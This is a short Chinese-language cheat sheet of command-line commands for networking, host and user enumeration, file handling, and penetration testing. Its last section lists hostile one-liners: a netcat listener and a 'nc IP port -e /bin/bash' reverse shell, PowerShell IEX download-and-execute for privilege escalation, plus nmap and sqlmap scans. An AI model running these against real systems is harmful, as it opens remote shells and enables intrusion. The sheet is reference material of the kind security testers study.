
## 一、网络基础命令
 | 命令 | 系统 | 用途 | 
|---|---|---|
 | `ipconfig` | Windows | 查看本机 IP、网关、DNS | 
 | `ifconfig` / `ip a` | Linux | 查看网络配置 | 
 | `ping [IP]` | 全平台 | 测试网络是否连通 | 
 | `tracert [IP]` / `traceroute [IP]` | Windows / Linux | 路由追踪 | 
 | `netstat -ano` | Windows | 查看端口占用/监听状态 | 
 | `ss -tunlp` | Linux | 查看端口和监听服务 | 
 | `arp -a` | 全平台 | 查看局域网主机列表 | 
 | `nslookup [域名]` | 全平台 | 域名解析为 IP | 
 | `route print` / `ip route` | Windows / Linux | 查看路由表 |

## 二、主机信息与用户权限
 | 命令 | 系统 | 用途 | 
|---|---|---|
 | `hostname` | 全平台 | 查看主机名 | 
 | `whoami` | 全平台 | 当前用户 | 
 | `systeminfo` | Windows | 系统详细信息 | 
 | `id` | Linux | 当前用户 UID/GID | 
 | `net user` | Windows | 本机用户列表 | 
 | `net localgroup administrators` | Windows | 管理员组成员 | 
 | `sudo -l` | Linux | 查看当前用户可执行的 sudo 权限 |

## 三、文件系统与操作
 | 命令 | 系统 | 用途 | 
|---|---|---|
 | `dir` | Windows | 查看当前目录文件 | 
 | `ls -al` | Linux | 查看文件（含隐藏） | 
 | `cd` | 全平台 | 进入目录 | 
 | `pwd` | Linux | 显示当前目录 | 
 | `type 文件名` | Windows | 查看文件内容 | 
 | `cat 文件名` | Linux | 查看文件内容 | 
 | `copy` / `cp` | Windows / Linux | 复制文件 | 
 | `del` / `rm` | Windows / Linux | 删除文件 | 
 | `move` / `mv` | Windows / Linux | 移动或重命名文件 |

## 五、常用渗透命令
 | 命令 | 工具/系统 | 用途 | 
|---|---|---|
 | `nmap -sV -Pn -p- IP` | Nmap | 全端口服务扫描 | 
 | `sqlmap -u "url参数" --dbs` | sqlmap | SQL 注入测试 | 
 | `nc -lvp 4444` | Netcat | 本地监听反弹 shell | 
 | `nc IP 端口 -e /bin/bash` | Netcat | 发起反弹 shell（Linux） | 
 | `python3 -m http.server` | Python | 快速建本地 HTTP 服务 | 
 | `powershell IEX(...)` | PowerShell | 下载+执行脚本（内网提权常用） | 
 | `curl` / `wget` | 全平台 | 下载远程文件 | 
 | `msfconsole` | Metasploit | 渗透测试主控平台 | 
 | `burpsuite` | Burp Suite | 拦截、改包、注入测试 |
